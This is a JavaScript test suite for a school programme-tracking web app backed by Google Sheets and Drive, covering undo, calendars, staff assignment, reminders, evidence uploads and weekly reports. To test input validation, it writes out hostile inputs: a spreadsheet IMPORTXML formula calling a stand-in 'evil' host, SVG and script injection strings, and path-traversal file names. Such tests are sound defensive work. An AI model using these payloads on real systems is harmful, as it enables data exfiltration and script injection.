ok(!JSON.parse(as('principal@school.test', () => G('api_bootstrap')())).me.photo, "nobody else's account carries it");
throws(() => as('exec@school.test', () => G('api_savePhoto')('data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pg==')), 'INPUT', 'an SVG (which can carry script) is refused');
throws(() => as('exec@school.test', () => G('api_savePhoto')('data:text/html;base64,PGI+')), 'INPUT', 'a non-image is refused');
throws(() => as('exec@school.test', () => G('api_savePhoto')('https://example.org/me.jpg')), 'INPUT', 'a link instead of a picture is refused');
throws(() => as('exec@school.test', () => G('api_savePhoto')('data:image/jpeg;base64,' + 'A'.repeat(60000))), 'INPUT', 'an oversized picture is refused');
as('exec@school.test', () => G('api_savePhoto')(''));
ok(!JSON.parse(as('exec@school.test', () => G('api_bootstrap')())).me.photo, 'a picture can be removed');

// ---- undo: a leader's edit, a sent report, a review decision ----
todayIso = '2026-11-15';
G('api_saveUser')(JSON.stringify({ email: 'exec@school.test', name: 'Exec', role: 'teacher', stages: [EPI], aliases: ['وليد يوسف'] }));
const t5 = JSON.parse(G('api_bootstrap')()).programs.find(p => p.stage === EPI && !p.done && p.c.done && p.c.actual && p.c.evidence && p.kpi !== 'C.Br 3.3' && p.kpi !== 'C.Br 1.3');
const sh5 = main.getSheetByName(t5.sheet), cellOf = k => sh5.data[t5.row - 1][t5.c[k] - 1];
const was = { done: cellOf('done'), actual: cellOf('actual'), evidence: cellOf('evidence') };
let ed = as('vp@school.test', () => JSON.parse(G('api_updateExecution')(t5.key, JSON.stringify({ done: true, actual: 41, evidence: 'https://drive.google.com/e5' }))));
ok(ed.ok && /^[\w-]{20,}$/.test(ed.undoId) && cellOf('actual') === 41, 'an edit returns an undo reference');
throws(() => as('principal@school.test', () => G('api_undoExecution')(ed.undoId)), 'GONE', "one leader cannot undo another leader's edit");
throws(() => as('exec@school.test', () => G('api_undoExecution')(ed.undoId)), 'FORBIDDEN', 'a teacher cannot undo an edit');
sh5.writes = [];
let un = as('vp@school.test', () => JSON.parse(G('api_undoExecution')(ed.undoId)));
ok(un.ok && cellOf('done') === was.done && cellOf('actual') === was.actual && cellOf('evidence') === was.evidence && sh5.writes.every(w => w[0] === t5.row), 'undo puts back exactly what the three cells held, in that row only');
throws(() => as('vp@school.test', () => G('api_undoExecution')(ed.undoId)), 'GONE', 'an undo works once');
const sneaky = as('vp@school.test', () => JSON.parse(G('api_updateExecution')(t5.key, JSON.stringify({ restore: true, evidence: 'https://ok.example/x' }))));
throws(() => as('vp@school.test', () => G('api_updateExecution')(t5.key, JSON.stringify({ restore: true, evidence: '=IMPORTXML("http://evil","//a")' }))), 'INPUT', 'the page cannot switch off the input checks by claiming to restore');
as('vp@school.test', () => G('api_undoExecution')(sneaky.undoId));

const s6 = as('exec@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: t5.key, outcome: 'done', actual: 19, evidence: 'https://drive.google.com/s6' }))));
throws(() => as('vp@school.test', () => G('api_withdraw')(s6.id)), 'GONE', "nobody can withdraw someone else's report");
as('exec@school.test', () => G('api_withdraw')(s6.id));
ok(!JSON.parse(as('vp@school.test', () => G('api_bootstrap')())).submissions.some(x => x.id === s6.id), 'the sender withdraws a report that is still waiting');
const s7 = as('exec@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: t5.key, outcome: 'done', actual: 19, evidence: 'https://drive.google.com/s7' }))));
rv = as('vp@school.test', () => JSON.parse(G('api_review')(s7.id, 'approved', 'تم')));
ok(rv.submission.status === 'approved' && cellOf('done') === true && cellOf('actual') === 19, 'approval wrote to the main file');
ok(!('undo' in rv.submission) && JSON.parse(as('vp@school.test', () => G('api_bootstrap')())).submissions.every(x => !('undo' in x) && !('_row' in x)), "the server's undo record stays on the server");
ok(typeof control.getSheetByName('Audit').data[1][0] === 'string' && /^\d{4}-\d{2}-\d{2}T/.test(control.getSheetByName('Audit').data[1][0]), 'log times are written as text');
throws(() => as('exec@school.test', () => G('api_withdraw')(s7.id)), 'STATE', 'a reviewed report cannot be withdrawn');
throws(() => as('exec@school.test', () => G('api_reopen')(s7.id)), 'FORBIDDEN', 'a teacher cannot undo a review');
const ro = as('vp@school.test', () => JSON.parse(G('api_reopen')(s7.id)));
ok(ro.submission.status === 'pending' && !ro.submission.reviewedBy && cellOf('done') === was.done && cellOf('actual') === was.actual && cellOf('evidence') === was.evidence, 'undoing an approval makes the report wait again and restores the main file cells');
throws(() => as('vp@school.test', () => G('api_reopen')(s7.id)), 'STATE', 'a waiting report cannot be reopened twice');
rv = as('vp@school.test', () => JSON.parse(G('api_review')(s7.id, 'returned', 'ناقص')));
ok(JSON.parse(as('vp@school.test', () => G('api_reopen')(s7.id))).submission.status === 'pending', 'a returned report can be reopened too');

// ---- private calendars ----
ok(control.getSheetByName('Tasks').formats.some(f => f[4] === '@') && control.getSheetByName('Sessions').formats.some(f => f[4] === '@'), 'calendar tabs are plain text, so the sheet never reinterprets dates and times');
throws(() => as('exec@school.test', () => G('api_saveTask')(JSON.stringify({ title: 'x', date: '2026-11-16' }))), 'FORBIDDEN', 'tasks are for admins only');
throws(() => as('vp@school.test', () => G('api_saveTask')(JSON.stringify({ title: '', date: '2026-11-16' }))), 'INPUT', 'a task needs a title');
throws(() => as('vp@school.test', () => G('api_saveTask')(JSON.stringify({ title: 'x', date: '16/11/2026' }))), 'INPUT', 'a task needs a proper date');
throws(() => as('vp@school.test', () => G('api_saveTask')(JSON.stringify({ title: 'x', date: '2026-11-16', until: '2026-11-01' }))), 'INPUT', 'a task cannot end before it starts');
const daily = as('principal@school.test', () => JSON.parse(G('api_saveTask')(JSON.stringify({ title: 'جولة صباحية خاصة', date: '2026-11-15', repeat: 'daily', time: '07:10', notify: true, note: '=1+1' }))));
const weekly = as('principal@school.test', () => JSON.parse(G('api_saveTask')(JSON.stringify({ title: 'اجتماع أسبوعي خاص', date: '2026-11-17', repeat: 'weekly', time: '99:99' }))));
const quiet = as('principal@school.test', () => JSON.parse(G('api_saveTask')(JSON.stringify({ title: 'مهمة صامتة', date: '2026-11-17', repeat: 'none', notify: false }))));
ok(daily.id && daily.repeat === 'daily' && daily.time === '07:10' && daily.note.startsWith("'=") && weekly.time === '', 'an admin saves daily and weekly tasks; bad times are dropped and formula text neutralised');
ok(JSON.parse(as('principal@school.test', () => G('api_myCalendar')())).tasks.length === 3, 'the owner sees their tasks');
ok(JSON.parse(as('vp@school.test', () => G('api_myCalendar')())).tasks.length === 0 && JSON.parse(G('api_myCalendar')()).tasks.length === 0, 'no other admin, not even the technical owner, sees them');
throws(() => as('vp@school.test', () => G('api_deleteTask')(daily.id)), 'GONE', "an admin cannot delete another admin's task");
throws(() => as('vp@school.test', () => G('api_saveTask')(JSON.stringify({ id: daily.id, title: 'hijack', date: '2026-11-15' }))), 'GONE', "or change it");
const AP = vm.runInContext('AP', ctx), mine3 = JSON.parse(as('principal@school.test', () => G('api_myCalendar')())).tasks;
const due = d => AP.tasksOn(mine3, d).map(x => x.title);
ok(due('2026-11-15').length === 1 && due('2026-11-17').length === 3 && due('2026-11-20').length === 0 && due('2026-11-21').length === 0 && due('2026-11-24').length === 2, 'daily tasks fall on school days (Sunday to Thursday), weekly tasks on their weekday, one-off tasks once');
const doneOne = as('principal@school.test', () => JSON.parse(G('api_saveTask')(JSON.stringify(Object.assign({}, weekly, { done: ['2026-11-17', 'junk'] })))));
ok(doneOne.done.join() === '2026-11-17' && AP.tasksOn([doneOne], '2026-11-17').length === 0 && AP.tasksOn([doneOne], '2026-11-24').length === 1, 'ticking a repeating task off covers that day only');
props.delete('WA_TOKEN'); todayIso = '2026-11-17'; mails.length = 0; props.delete('NOTIFY_LAST');
G('notifyTrigger')();
const pm = mails.find(m => m.to === 'principal@school.test');
ok(pm && pm.body.includes('جولة صباحية خاصة') && pm.htmlBody.includes('جولة صباحية خاصة') && !pm.body.includes('اجتماع أسبوعي خاص') && !pm.body.includes('مهمة صامتة'), "the daily message carries the admin's own tasks that are due, not the ticked-off or silent ones");
ok(mails.filter(m => m.to !== 'principal@school.test').every(m => !m.body.includes('خاصة') && !m.htmlBody.includes('خاصة')), "nobody else's message mentions them");
ok(!JSON.stringify(JSON.parse(as('vp@school.test', () => G('api_notifications')()))).includes('جولة صباحية خاصة'), 'and they never appear on the shared notifications page');
props.set('SITE_URL', 'https://control.example.org/'); mails.length = 0; props.delete('NOTIFY_LAST'); G('notifyTrigger')();
ok(mails.length > 0 && mails.every(m => m.htmlBody.includes('<a href="https://control.example.org/"')), 'the email button links to the site');
as('principal@school.test', () => G('api_deleteTask')(quiet.id));
ok(JSON.parse(as('principal@school.test', () => G('api_myCalendar')())).tasks.length === 2, 'the owner deletes a task');

throws(() => as('exec@school.test', () => G('api_saveSession')(JSON.stringify({ weekday: 1, start: '09:00', end: '08:00', subject: 'English' }))), 'INPUT', 'a session cannot end before it starts');
throws(() => as('exec@school.test', () => G('api_saveSession')(JSON.stringify({ weekday: 9, start: '08:00', end: '08:45', subject: 'English' }))), 'INPUT', 'a session needs a real weekday');
throws(() => as('exec@school.test', () => G('api_saveSession')(JSON.stringify({ weekday: 1, start: '08:00', end: '08:45', subject: '' }))), 'INPUT', 'a session needs a subject');
const se = as('exec@school.test', () => JSON.parse(G('api_saveSession')(JSON.stringify({ weekday: 1, start: '08:00', end: '08:45', subject: 'English', klass: '5A', room: 'R12' }))));
ok(se.id && se.weekday === 1 && JSON.parse(as('exec@school.test', () => G('api_myCalendar')())).sessions.length === 1, 'a teacher saves a session in their own timetable');
ok(JSON.parse(as('exec@school.test', () => G('api_myCalendar')())).tasks.length === 0, 'a teacher has no tasks calendar');
ok(JSON.parse(as('principal@school.test', () => G('api_myCalendar')())).sessions.length === 0, "an admin does not see a teacher's private timetable");
throws(() => as('principal@school.test', () => G('api_deleteSession')(se.id)), 'GONE', 'or delete from it');
const se2 = as('exec@school.test', () => JSON.parse(G('api_saveSession')(JSON.stringify(Object.assign({}, se, { room: 'Lab 2' })))));
ok(se2.id === se.id && se2.room === 'Lab 2' && JSON.parse(as('exec@school.test', () => G('api_myCalendar')())).sessions.length === 1, 'changing a session keeps one row');
// a sheet that turned text into real dates and times is still read correctly
const tsh = control.getSheetByName('Tasks'), TC = vm.runInContext('TASK_COLS', ctx), trow = tsh.data.findIndex(r => r[0] === daily.id);
tsh.data[trow][TC.indexOf('date')] = new Date('2026-11-15T00:00:00Z'); tsh.data[trow][TC.indexOf('time')] = new Date('1899-12-30T07:10:00Z');
const back = JSON.parse(as('principal@school.test', () => G('api_myCalendar')())).tasks.find(x => x.id === daily.id);
ok(back.date === '2026-11-15' && back.time === '07:10', 'dates and times that the sheet converted are read back in the same form');
as('exec@school.test', () => G('api_deleteSession')(se.id));
ok(JSON.parse(as('exec@school.test', () => G('api_myCalendar')())).sessions.length === 0, 'a teacher deletes a session');
const sessN = post({ fn: 'api_myCalendar', args: [] });
ok(sessN.code === 'AUTH' && post({ fn: 'api_saveTask', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_savePhoto', args: [PIC] }).code === 'AUTH' && post({ fn: 'api_undoExecution', args: ['x'] }).code === 'AUTH', 'the new actions need a session on the website too');

// ---- responsible people chosen in the platform ----
todayIso = '2026-11-15';
G('api_sync')();
const progs = JSON.parse(G('api_bootstrap')()).programs;
const freeE = progs.filter(p => p.stage === EPI && !p.assignee && !p.done && p.from && p.week);   // nobody named in the main file
const freeM = progs.find(p => p.stage === MBI && !p.assignee), freeN = progs.find(p => p.stage === EPN && !p.assignee);
const asg = (who, keys, email) => as(who, () => JSON.parse(G('api_assign')(JSON.stringify({ keys, email }))));
const A = control.getSheetByName('Assignments'), aRows = () => A.data.slice(1).filter(r => r[0]);
ok(!!A && aRows().length === 0, 'setup creates the Assignments tab, empty');
throws(() => asg('exec@school.test', [freeE[0].key], 'exec@school.test'), 'FORBIDDEN', 'a teacher cannot assign programmes, not even to themselves');
throws(() => asg('vp@school.test', [freeN.key], 'exec@school.test'), 'FORBIDDEN', 'an admin cannot assign outside their own stages');
throws(() => asg('vp@school.test', [freeM.key], 'exec@school.test'), 'INPUT', "the person must belong to the programme's stage");
throws(() => asg('vp@school.test', [freeE[0].key], 'stranger@school.test'), 'INPUT', 'someone who is not on the staff list cannot be made responsible');
throws(() => asg('vp@school.test', [freeE[0].key], 'teacher@school.test'), 'INPUT', 'nor a suspended member of staff');
throws(() => asg('vp@school.test', [], 'exec@school.test'), 'INPUT', 'an empty list is refused');
throws(() => asg('vp@school.test', ['no-such-programme'], 'exec@school.test'), 'GONE', 'an unknown programme is refused');
throws(() => asg('vp@school.test', [freeE[0].key, freeN.key], 'exec@school.test'), 'FORBIDDEN', 'one programme out of reach stops the whole request');
ok(aRows().length === 0, 'and nothing is saved from a refused request');
main.getSheets().forEach(sh => { sh.writes = []; });
const a1 = asg('vp@school.test', [freeE[0].key, freeE[1].key, freeE[0].key], 'exec@school.test');
ok(a1.assign[freeE[0].key].email === 'exec@school.test' && a1.assign[freeE[1].key].name === 'Exec' && /^[\w-]{20,}$/.test(a1.undoId) && aRows().length === 2, 'an admin makes one person responsible for several programmes');
ok(main.getSheets().every(sh => sh.writes.length === 0), 'nothing is written to the main file');
ok(aRows()[0][1] === 'exec@school.test' && aRows()[0][2] === EPI && aRows()[0][5] === 'vp@school.test' && /^\d{4}-/.test(aRows()[0][6]), 'the tab records who, which stage, and which admin chose');
const eb = as('exec@school.test', () => JSON.parse(G('api_bootstrap')()));
ok(eb.assign[freeE[0].key].me === true && !('email' in eb.assign[freeE[0].key]) && Object.keys(eb.assign).length === 2, 'the person sees the programmes as theirs; staff receive names, not addresses');
ok(as('quran@school.test', () => JSON.parse(G('api_bootstrap')())).assign[freeE[0].key].me === false, 'a colleague in the same stage sees whose it is, and that it is not theirs');
ok(as('principal@school.test', () => JSON.parse(G('api_bootstrap')())).assign[freeE[0].key].email === 'exec@school.test', 'admins get the address, as in the staff list');

// reminders follow the chosen person
const soonP = freeE.find(p => p.from > '2026-11-20' && ![freeE[0].key, freeE[1].key].includes(p.key));
todayIso = AP.shiftDay(soonP.from, -3);
const execItems = () => { const r = JSON.parse(as('principal@school.test', () => G('api_notifications')())).list.find(x => x.email === 'exec@school.test'); return r ? r.items : []; };
ok(!execItems().some(i => i.key === soonP.key), 'a programme with no one named sends its three-days-before reminder to nobody');
asg('vp@school.test', [soonP.key], 'exec@school.test');
ok(execItems().some(i => i.key === soonP.key && i.kind === 'd3' && i.role === 'exec'), 'once assigned, its reminder goes to the chosen person');
const named = progs.find(p => p.stage === EPI && /وليد يوسف/.test(p.assignee || '') && !p.done && p.from > '2026-11-20');
todayIso = AP.shiftDay(named.from, -3);
const itemsOf = e => { const r = JSON.parse(as('principal@school.test', () => G('api_notifications')())).list.find(x => x.email === e); return r ? r.items.filter(i => i.key === named.key) : []; };
ok(itemsOf('exec@school.test').some(i => i.role === 'exec') && !itemsOf('quran@school.test').some(i => i.role === 'exec'), 'without a choice, the name in the main file decides');
const a2 = asg('principal@school.test', [named.key], 'quran@school.test');
ok(itemsOf('quran@school.test').some(i => i.role === 'exec') && !itemsOf('exec@school.test').some(i => i.role === 'exec'), "the admin's choice takes over from the name in the main file");

// undo, removal, people who leave
throws(() => as('vp@school.test', () => G('api_undoAssign')(a2.undoId)), 'GONE', "one admin cannot undo another admin's assignment");
throws(() => as('exec@school.test', () => G('api_undoAssign')(a1.undoId)), 'FORBIDDEN', 'a teacher cannot undo an assignment');
const u2 = as('principal@school.test', () => JSON.parse(G('api_undoAssign')(a2.undoId)));
ok(u2.assign[named.key] === null && itemsOf('exec@school.test').some(i => i.role === 'exec'), 'undo gives the programme back to whoever had it');
throws(() => as('principal@school.test', () => G('api_undoAssign')(a2.undoId)), 'GONE', 'an undo works once');
const a3 = asg('vp@school.test', [freeE[0].key], 'quran@school.test');
ok(a3.assign[freeE[0].key].email === 'quran@school.test' && aRows().filter(r => r[0] === freeE[0].key).length === 1, 'reassigning replaces the person; a programme has one responsible person');
ok(JSON.parse(as('vp@school.test', () => G('api_undoAssign')(a3.undoId))).assign[freeE[0].key].email === 'exec@school.test', 'undoing a reassignment returns it to the previous person');
ok(asg('vp@school.test', [freeE[1].key], '').assign[freeE[1].key] === null && !aRows().some(r => r[0] === freeE[1].key), 'an assignment can be removed');
G('api_saveUser')(JSON.stringify({ email: 'exec@school.test', name: 'Exec', role: 'teacher', stages: [EPI], aliases: ['وليد يوسف'], active: false }));
ok(!(freeE[0].key in JSON.parse(G('api_bootstrap')()).assign), 'when a person is suspended, their programmes show as having no one');
G('api_saveUser')(JSON.stringify({ email: 'exec@school.test', name: 'Exec', role: 'teacher', stages: [EPI], aliases: ['وليد يوسف'] }));
ok(JSON.parse(G('api_bootstrap')()).assign[freeE[0].key].email === 'exec@school.test', 'and return to them when they are active again');

// the main file changes: the programme moves to another week, so its key changes
const mv = freeE[0], shM = main.getSheetByName(mv.sheet), rowM = shM.data[mv.row - 1], col = rowM.findIndex(c => /الأسبوع\s*\d+/.test(String(c)));
rowM[col] = 'الأسبوع ' + (mv.week === 9 ? 10 : 9);
G('api_sync')();
const after = JSON.parse(G('api_bootstrap')());
const moved = after.programs.find(p => p.sheet === mv.sheet && p.row === mv.row);
ok(moved.key !== mv.key && after.assign[moved.key] && after.assign[moved.key].email === 'exec@school.test' && !aRows().some(r => r[0] === mv.key), 'when the main file moves a programme to another week, its responsible person follows it');
ok(JSON.parse(G('api_audit')(5)).some(x => x.action === 'sync' && /"assignmentsFollowed":1/.test(x.details)), 'the sync records that it followed one assignment');
ok(post({ fn: 'api_assign', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_undoAssign', args: ['x'] }).code === 'AUTH', 'assignment needs a session on the website too');

// ---- follow-up after a programme becomes overdue ----
const fresh = () => JSON.parse(G('api_bootstrap')()).programs;
const lateP = fresh().find(p => p.stage === EPI && !p.done && p.to && p.to > '2026-12-01' && p.to < '2027-03-01' && !Object.keys(JSON.parse(G('api_bootstrap')()).assign).includes(p.key));
asg('vp@school.test', [lateP.key], 'exec@school.test');
const kindsFor = e => { const r = JSON.parse(as('principal@school.test', () => G('api_notifications')())).list.find(x => x.email === e); return r ? r.items.filter(i => i.key === lateP.key).map(i => i.kind).join() : ''; };
todayIso = lateP.to;
ok(!/o/.test(kindsFor('exec@school.test')), 'on the end date itself nobody is chased yet');
todayIso = AP.shiftDay(lateP.to, 1);
ok(kindsFor('exec@school.test') === 'o1' && kindsFor('principal@school.test') === '', 'the day after the end date, the responsible person is reminded and the admins are not');
todayIso = AP.shiftDay(lateP.to, 3);
ok(kindsFor('exec@school.test') === '' && kindsFor('principal@school.test') === '', 'nothing in between');
todayIso = AP.shiftDay(lateP.to, 7);
ok(kindsFor('exec@school.test') === 'o7' && kindsFor('principal@school.test') === 'o7' && kindsFor('vp@school.test') === 'o7', 'a week after, the person is reminded again and the admins are told');
mails.length = 0; props.delete('NOTIFY_LAST'); G('notifyTrigger')();
ok(mails.find(m => m.to === 'exec@school.test').body.includes('متأخر منذ أسبوع') && mails.find(m => m.to === 'exec@school.test').htmlBody.includes('متأخر منذ أسبوع'), 'the message says the programme is a week overdue');
todayIso = AP.shiftDay(lateP.to, 8);
ok(kindsFor('exec@school.test') === '', 'and the reminders then stop');
const rpt = as('exec@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: lateP.key, outcome: 'done', actual: 5 }))));
todayIso = AP.shiftDay(lateP.to, 1);
ok(kindsFor('exec@school.test') === '', 'once a report is waiting for review, the person is not chased');
as('vp@school.test', () => G('api_review')(rpt.id, 'returned', 'ناقص'));
ok(kindsFor('exec@school.test') === 'o1', 'a returned report puts the reminder back');
todayIso = '2026-11-15';

// ---- evidence files kept in Google Drive ----
const JPG = Buffer.concat([Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), Buffer.alloc(600, 7)]).toString('base64'), PDF = Buffer.from('%PDF-1.7\n' + 'x'.repeat(300)).toString('base64');
const rawUp = (who, o) => as(who, () => JSON.parse(G('api_uploadEvidence')(JSON.stringify(o))));
const freeRate = () => cache.forEach((v, k) => { if (k.startsWith('rate:upload:')) cache.delete(k); });
const up = (who, o) => { freeRate(); return rawUp(who, o); };   // the limit has its own check below
const evP = fresh().find(p => p.stage === EPI && p.kpi === 'C.Br 3.3'), evOther = fresh().find(p => p.stage === EPN);
ok(drive.items.length === 1 && drive.items[0].folder && drive.items[0].name === 'مسار الإنجاز - شواهد' && drive.items[0].parent === null, 'setup makes one evidence folder at the top of Drive');
throws(() => up('exec@school.test', { programKey: evOther.key, mime: 'image/jpeg', data: JPG }), 'FORBIDDEN', "a teacher cannot upload evidence for another stage's programme");
throws(() => up('exec@school.test', { programKey: 'nope', mime: 'image/jpeg', data: JPG }), 'GONE', 'an unknown programme is refused');
throws(() => up('exec@school.test', { programKey: evP.key, mime: 'text/html', data: Buffer.from('<script>alert(1)</script>').toString('base64') }), 'INPUT', 'a web page is refused');
throws(() => up('exec@school.test', { programKey: evP.key, mime: 'image/svg+xml', data: Buffer.from('<svg onload=alert(1)>').toString('base64') }), 'INPUT', 'an SVG is refused');
throws(() => up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: Buffer.from('MZ this is a program, not a picture').toString('base64') }), 'INPUT', 'a file that only claims to be a picture is refused');
throws(() => up('exec@school.test', { programKey: evP.key, mime: 'application/pdf', data: JPG }), 'INPUT', 'a picture sent as a PDF is refused');
throws(() => up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: 'not base64 !!' }), 'INPUT', 'data that is not a file is refused');
throws(() => up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: Buffer.concat([Buffer.from([0xFF, 0xD8, 0xFF]), Buffer.alloc(6.5 * 1024 * 1024)]).toString('base64') }), 'INPUT', 'a file over 6 MB is refused');
ok(drive.items.length === 1, 'and nothing reaches Drive from a refused upload');
const e1 = up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: JPG, name: '../../evil<name>.jpg' });
const f1 = drive.items.find(f => !f.folder), kpiDir = drive.items.find(f => f.id === f1.parent), stageDir = drive.items.find(f => f.id === kpiDir.parent);
ok(e1.url === 'https://drive.google.com/file/d/' + f1.id + '/view' && e1.shared === true, 'a photo is saved and its link returned');
ok(kpiDir.name === 'C.Br 3.3' && stageDir.name === EPI && stageDir.parent === drive.items[0].id, 'it is filed under stage, then indicator');
ok(f1.mime === 'image/jpeg' && f1.media.equals(Buffer.from(JPG, 'base64')), 'the file arrives byte for byte');
ok(/^\d{4}-\d{2}-\d{2} /.test(f1.name) && f1.name.endsWith(' - Exec.jpg') && !/[\\/<>]/.test(f1.name), "the file is named by the server (date, programme, person), not by the name the device sent");
ok(drive.perms.length === 1 && drive.perms[0].file === f1.id && drive.perms[0].type === 'domain' && drive.perms[0].domain === 'school.test' && drive.perms[0].role === 'reader' && drive.perms[0].allowFileDiscovery === false, 'only the file is shared, with school accounts that have the link; the folders stay private');
ok(drive.calls.every(c => c.auth === 'Bearer script-token'), "every Drive call carries the script's own permission");
const before2 = drive.items.filter(f => f.folder).length;
const e2 = up('exec@school.test', { programKey: evP.key, mime: 'application/pdf', data: PDF });
ok(drive.items.filter(f => f.folder).length === before2 && drive.items.find(f => f.name.endsWith('.pdf')).parent === kpiDir.id, 'a second file for the same indicator reuses the folder');
const e3 = up('exec@school.test', { stage: EPI, kpi: 'C.Br 1.3', mime: 'image/jpeg', data: JPG });
ok(e3.url.startsWith('https://drive.google.com/file/d/') && drive.items.some(f => f.folder && f.name === 'C.Br 1.3'), 'evidence for work on an indicator is filed under that indicator');
throws(() => up('exec@school.test', { stage: EPI, kpi: '../secret', mime: 'image/jpeg', data: JPG }), 'INPUT', 'a made-up indicator name is refused');
const s8 = as('exec@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: evP.key, outcome: 'partial', evidence: e1.url }))));
ok(s8.evidence === e1.url, 'the uploaded link is accepted as the evidence of a report');
const tops = () => drive.items.filter(f => f.folder && f.name === 'مسار الإنجاز - شواهد').length;
drive.items = drive.items.filter(f => f.id !== kpiDir.id);
const e4 = up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: JPG });
ok(e4.url.startsWith('https://') && tops() === 1 && drive.items.some(f => f.folder && f.name === 'C.Br 3.3' && f.parent === stageDir.id && f.id !== kpiDir.id), "if an indicator's folder was deleted in Drive, only that folder is made again");
drive.items = drive.items.filter(f => f.id !== stageDir.id);
ok(up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: JPG }).url.startsWith('https://') && tops() === 1, "the same for a stage's folder");
drive.items = [];
ok(up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: JPG }).url.startsWith('https://') && tops() === 1 && drive.items.length === 4, 'and if everything was deleted, the whole path is made again');
drive.failWith = 403;
let leak = '';
try { up('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: JPG }); } catch (e) { leak = e.message; }
ok(leak.startsWith('SETUP|') && !/internal detail/.test(leak), 'when Drive refuses, the page gets a plain message and no internal detail');
drive.failWith = 0;
freeRate();
let ups = 0, limited = '';
try { for (; ups < 30; ups++) rawUp('exec@school.test', { programKey: evP.key, mime: 'image/jpeg', data: JPG }); } catch (e) { limited = e.message; }
ok(ups === 12 && limited.startsWith('RATE|'), 'uploads are limited to twelve in ten minutes per person');
ok(post({ fn: 'api_uploadEvidence', args: [JSON.stringify({ programKey: evP.key, mime: 'image/jpeg', data: JPG })] }).code === 'AUTH', 'upload needs a session on the website too');
ok(JSON.parse(G('api_audit')(60)).some(x => x.action === 'evidence-uploaded' && /"bytes":604/.test(x.details)), 'every upload is recorded in the activity log');

// ---- weekly report for the admins ----
const H = control.getSheetByName('History'), hRows = () => H.data.slice(1).filter(r => r[0]);
const weeklyMails = () => mails.filter(m => m.subject.startsWith('التقرير الأسبوعي'));
H.data.length = 1; props.delete('WEEKLY_LAST');          // earlier checks ran the daily trigger on some Sundays
G('api_saveUser')(JSON.stringify({ email: 'vp@school.test', name: 'VP', role: 'vp', stages: [EPI, MBI], phone: '966500000003', channel: 'whatsapp' }));
throws(() => as('exec@school.test', () => G('api_weekly')()), 'FORBIDDEN', 'a teacher cannot open the weekly report');
throws(() => as('exec@school.test', () => G('api_sendMyWeekly')()), 'FORBIDDEN', 'or have it emailed');
todayIso = '2026-11-22';             // a Sunday
const wk = JSON.parse(as('principal@school.test', () => G('api_weekly')()));
const pr = JSON.parse(as('principal@school.test', () => G('api_bootstrap')())).programs, R = AP.rules;
const intl = pr.filter(p => R.schoolOf(p.stage) === 'intl'), cI = R.counts(intl, todayIso);
ok(wk.today === '2026-11-22' && wk.to === '2026-11-28' && Object.keys(wk.schools).sort().join() === 'intl,private' && Object.keys(wk.stages).length === 3, 'the report covers the coming week, each school and each stage');
ok(wk.schools.intl.total === intl.length && ['done', 'active', 'soon', 'overdue', 'upcoming', 'undated'].every(k => wk.schools.intl.counts[k] === cI[k]) && wk.schools.intl.pct === Math.round(cI.done * 100 / intl.length), "a school's numbers are the same numbers the home page shows");
ok(wk.schools.intl.total === wk.stages[EPI].total + wk.stages[MBI].total && wk.schools.private.total === wk.stages[EPN].total, 'the stages add up to their school');
const lateI = wk.schools.intl.late;
ok(wk.schools.intl.lateTotal === cI.overdue && lateI.length === Math.min(12, cI.overdue) && lateI.every((x, i) => x.days > 0 && (i === 0 || lateI[i - 1].to <= x.to)), 'the late list starts with the longest overdue');
ok(wk.schools.intl.ahead.every(x => x.from >= '2026-11-22' && x.from <= '2026-11-28') && wk.schools.intl.aheadTotal === intl.filter(p => !p.done && p.from >= '2026-11-22' && p.from <= '2026-11-28').length, 'the week ahead lists what starts in the next seven days');
ok(wk.schools.intl.indicators.length === new Set(intl.map(p => p.kpi)).size && wk.schools.intl.indicators.every(i => i.n > 0 && ['done', 'active', 'soon', 'overdue', 'upcoming', 'undated'].includes(i.state)), 'every indicator has a line with its state');
const execLine = wk.stages[EPI].people.find(x => x.name === 'Exec'), execOwn = Object.entries(JSON.parse(as('exec@school.test', () => G('api_bootstrap')())).assign).filter(([k, v]) => v.me).length;
ok(execLine && execLine.n >= execOwn && execOwn > 0 && !JSON.stringify(wk).includes('@school.test'), 'each person has a line counting the programmes they answer for, by name and without addresses');
const staffNow = JSON.parse(G('api_users')()).filter(x => x.active), chosenNow = JSON.parse(as('principal@school.test', () => G('api_bootstrap')())).assign;
const expectFree = intl.filter(p => !chosenNow[p.key] && !AP.namedIn(p.assignee || '', staffNow).length).length;
ok(wk.schools.intl.free === expectFree && expectFree > 0 && expectFree < intl.length, 'it counts the programmes no one answers for in the platform (' + expectFree + ')');
ok(wk.schools.intl.prev === null, 'the first report has no earlier week to compare with');
const vw = JSON.parse(as('vp@school.test', () => G('api_weekly')()));
ok(!vw.schools.private && Object.keys(vw.stages).sort().join() === [EPI, MBI].sort().join(), 'an admin gets only the stages they cover');

// the Sunday run
props.set('WEEKLY', 'on'); props.set('NOTIFY', 'off'); props.delete('WEEKLY_LAST'); mails.length = 0;
G('notifyTrigger')();
ok(weeklyMails().length === 2 && weeklyMails().map(m => m.to).sort().join() === 'principal@school.test,vp@school.test' && mails.length === 2, 'on its day the report goes to each admin by email, even when the daily messages are off, and not to the technical owner');
const pmail = weeklyMails().find(m => m.to === 'principal@school.test'), vmail = weeklyMails().find(m => m.to === 'vp@school.test');
ok(pmail.htmlBody.includes('مدارس الأندلس الأهلية') && pmail.htmlBody.includes('مدارس الأندلس العالمية') && pmail.htmlBody.includes('dir="rtl"') && !/<script|<svg/i.test(pmail.htmlBody) && pmail.body.includes('التقرير الأسبوعي'), 'the email has a section for each school, in plain tables');
